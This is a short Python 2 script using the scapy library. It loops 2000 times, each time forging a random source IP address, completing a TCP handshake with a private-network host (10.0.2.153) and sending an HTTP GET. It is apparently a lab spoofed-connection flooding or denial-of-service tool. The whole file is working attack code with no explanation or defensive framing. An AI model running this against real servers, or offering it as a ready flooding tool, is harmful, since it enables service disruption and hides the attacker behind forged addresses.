import random, time, threading
from scapy.all import *

def req(sip):
	#three-way handshake
	sport=random.randint(4096,65535)
	r=srp1(Ether()/IP(src=sip,dst="10.0.2.153")/TCP(seq=random.randint(100000,2**28),sport=sport),iface="eth0")
	ack=r.seq+1
	seq=r.ack
	sendp(Ether()/IP(src=sip,dst="10.0.2.153")/TCP(seq=seq,ack=ack, flags="A", sport=sport), iface="eth0")
	sendp(Ether()/IP(src=sip,dst="10.0.2.153")/TCP(seq=seq,ack=ack, flags="PA", sport=sport)/"GET / HTTP/1.1\r\nHost:10.0.0.1\r\n\r\n",iface="eth0")

def int(t,f=1):
	return random.randint(f,t)

def ipv4():
	return "%d.%d.%d.%d"%(int(126),int(255),int(255),int(255))

for i in range(2000):
	sip=ipv4()
	print sip
	req(sip)
